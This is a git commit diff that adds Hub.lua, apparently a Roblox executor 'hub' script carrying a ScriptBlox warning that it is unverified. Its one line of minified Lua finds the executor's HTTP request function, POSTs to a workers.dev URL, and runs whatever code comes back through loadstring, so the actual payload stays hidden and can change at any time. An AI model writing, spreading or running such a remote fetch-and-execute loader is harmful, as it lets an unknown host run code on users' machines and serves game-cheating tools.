6efa18345495378ad9f3ec09a4616b092eee3a87
chead-z <155196242+chead-z@users.noreply.github.com>
2024-02-15 00:13:39 -0300

    Hub.lua

--- Hub.lua
+++ Hub.lua
@@ -1,1 +1,4 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
 local a,b,c,d=loadstring,request or http_request or(http and http.request)or(syn and syn.request),assert,"https://lhr.synteamenv.workers.dev/?page=script"c(a and b,"Your executor does not support.")a(b({Url=d,Method="POST",Headers={["Authorization"]="Elf and Tears"}}).Body)()
